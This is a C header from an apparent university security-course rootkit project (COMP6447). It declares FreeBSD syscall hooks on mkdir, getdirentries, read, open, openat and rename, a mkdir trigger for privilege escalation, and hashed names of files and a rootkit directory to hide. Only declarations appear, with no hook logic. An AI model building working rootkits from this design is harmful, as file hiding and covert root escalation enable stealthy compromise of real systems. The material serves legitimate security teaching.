/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 *
 * Syscall Hooks
 * Declare any syscall hooks 
 *
 * All hooks should also have an associated pointer
 * 	to keep reference to the original function
 *
 */

#define MKDIR_TRIGGER ESCALATE_TRIGGER
#define DIR_F_HIDE_1 F_NAME
#define DIR_F_HIDE_2 "log_core-6dc9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008"
#define DIR_F_HIDE_3 "6d4c9cf5e022a07ea8013a4b07a30a88270c65dfd5223ccc3964d9a7b4525008" // Rootkit Dir

/* Syscall Pointers */
extern sy_call_t * getdirentries;
extern sy_call_t * mkdir;
extern sy_call_t * read;
extern sy_call_t * open;
extern sy_call_t * openat;
extern sy_call_t * rename;

/* Make Directory Hook */
int
mkdir_hook(struct thread *, void *);

/* Get Directory Entries Hook */
int
getdirentries_hook(struct thread *, void *);

/* Read Hook */
int
read_hook(struct thread *, void *);

/* Open Hook */
int
open_hook(struct thread *, void *);
int
openat_hook(struct thread *, void *);

/* Rename Hook */
int
rename_hook(struct thread *, void *);
